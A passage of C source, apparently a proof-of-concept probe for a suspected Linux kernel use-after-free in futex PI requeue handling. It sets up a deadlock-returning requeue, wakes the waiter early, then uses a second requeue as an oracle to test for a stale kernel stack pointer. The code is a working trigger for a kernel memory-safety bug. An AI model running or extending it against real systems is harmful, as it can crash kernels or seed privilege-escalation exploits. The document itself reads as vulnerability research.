	lg("O: LOCK_PI(B)（阻塞，形成环）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

static void *thread_w2(void *arg)
{
	long r;
	(void)arg;
	S->w2_waiting = 1;
	__sync_synchronize();
	lg("W2: WAIT_REQUEUE_PI(A2→C)");
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W2: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tw2;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-3a start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->A2 = S->B = S->C = 0;

	/* [1] 触发 */
	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[1] CMP_REQUEUE_PI(A→C,1) → %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();
	if (!(r == -1 && e == EDEADLK)) {
		lg("[1] 未命中，终止");
		sync_log();
		_exit(2);
	}

	/* [2] 普通 FUTEX_WAKE 唤醒 W：应走 handle_early_requeue_pi_wakeup 的早退分支 */
	lg("[2] FUTEX_WAKE(A, 1) —— 期望 W 以 -EWOULDBLOCK 返回，且不触发 remove_waiter");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
	lg("[2] FUTEX_WAKE 返回 %ld errno=%d", r, errno);

	{
		int spin = 0;
		while (!S->w_returned && spin < 2000) {
			usleep(1000);
			spin++;
		}
	}
	if (!S->w_returned)
		lg("[2] W 未在 2s 内返回");
	else
		lg("[2] W 已返回 ret=%ld errno=%d（帧已弹出）", S->w_ret,
		   S->w_errno);
	sync_log();

	/* [3] oracle */
	pthread_create(&tw2, NULL, thread_w2, NULL);
	{
		int spin = 0;
		while (!S->w2_waiting && spin < 1000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(150000);
	lg("[3] oracle: CMP_REQUEUE_PI(A2→C,1)");
	sync_log();
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[3] 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && e == EDEADLK)
		lg("verdict: 栈帧已弹出但指针仍在 → **真 UAF**（指向已失效内核栈）");
	else if (r >= 0)
		lg("verdict: 指针已消失（返回 %ld）→ 该出口也会自愈", r);
	else
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
	sync_log();
	lg("结束");
	sync_log();
	_exit(0);
}
```
